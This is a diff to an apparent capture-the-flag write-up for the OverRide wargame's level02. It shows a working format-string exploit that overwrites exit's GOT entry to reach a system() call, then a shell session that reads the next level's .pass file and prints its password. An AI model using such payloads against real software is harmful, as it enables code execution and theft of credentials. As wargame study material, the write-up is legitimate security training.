@@ -93,11 +93,20 @@ level02@OverRide:~$ (python -c 'print "%8$p" + "\n" + "AAAA"') | ./level02
 x/s 0x601228
 0x601228 <exit@got.plt>
 
-p 0x601228 = 6296104
 
-callq  0x4006b0 <system@plt>
+----> 0x0000000000400a85 <+625>:	mov    edi,0x400d32 
+      0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
 
-`(python -c 'print "%6296104p%8$n" + "\n" + "\x40\x06\xb0"[::-1]' ; cat) | ./level02 > /dev/null`
+p 0x0000000000400a85 = 4196997
+
+```
+level02@OverRide:~$ (python -c 'print "%4196997p%8$n" + "\n" + "\x60\x12\x28"[::-1]' ; cat) | ./level02 > /dev/null
+pwd 1>&2
+/home/users/level02
+cat /home/users/level03/.pass
+cat /home/users/level03/.pass 1>&2
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
 
 
 
